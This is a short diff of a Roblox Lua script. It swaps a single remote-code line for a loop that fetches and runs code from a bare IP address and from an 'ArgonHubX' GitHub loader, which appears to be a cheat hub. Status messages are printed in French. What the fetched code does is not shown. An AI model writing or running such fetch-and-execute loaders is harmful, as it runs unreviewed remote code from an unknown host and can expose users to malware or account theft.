@@ -1,1 +1,24 @@
-loadstring(game:HttpGet("http://72.56.64.162/35ufMCnrdBDUqkq3TQiSdqBWaW5U7tH2g72yJWcObM2qgXrx2uRorhxGxjF4dfcDSqOGQPQpefbBvm13"))()
+local scripts = {
+    {
+        name = "Script 1",
+        url = "http://72.56.64.162/35ufMCnrdBDUqkq3TQiSdqBWaW5U7tH2g72yJWcObM2qgXrx2uRorhxGxjF4dfcDSqOGQPQpefbBvm13"
+    },
+    {
+        name = "ArgonHubX",
+        url = "https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"
+    }
+}
+
+for _, script in ipairs(scripts) do
+    spawn(function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet(script.url))()
+        end)
+        
+        if success then
+            print("✓ " .. script.name .. " chargé avec succès")
+        else
+            warn("✗ " .. script.name .. " a échoué: " .. tostring(err))
+        end
+    end)
+end
